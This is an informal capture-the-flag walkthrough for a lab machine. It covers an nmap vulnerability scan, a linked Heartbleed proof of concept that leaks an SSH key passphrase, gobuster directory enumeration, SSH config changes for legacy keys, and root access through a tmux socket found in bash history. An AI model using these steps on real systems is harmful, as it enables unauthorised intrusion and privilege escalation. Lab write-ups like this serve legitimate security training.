scanned the box foudn 3 ports

this is how we scan for vulnerabilities
sudo nmap {boxip} -p 22,80,443 -sV --script vuln

and found this vulnerability:
https://github.com/sensepost/heartbleed-poc
finds a passphrase: heartbleedbelievethehype

gobuster dir --url http://10.10.10.79/ --wordlist /usr/share/wordlists/dirb/big.txt -x txt
/cgi-bin/             (Status: 403) [Size: 287]
/decode               (Status: 200) [Size: 552]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]
/encode               (Status: 200) [Size: 554]
/index                (Status: 200) [Size: 38]
/server-status        (Status: 403) [Size: 292]

we find a hype_key thus this can be a user

lets try hype and the hype_key

but there is an error:
sign_and_send_pubkey: no mutual signature supported
to fix we needed to edit our ssh config:
nano ~/.ssh/config:
Host {boxip}
    HostName {boxip}
    User hype
    PubkeyAcceptedKeyTypes +ssh-rsa,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519
    HostkeyAlgorithms +ssh-rsa,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519

ssh -i hypekey {boxip}
and passphrase: heartbleedbelievethehype

cat .bash_history
shows a tmux session, so connecting to its in the root user:
tmux -S /.devs/dev_sess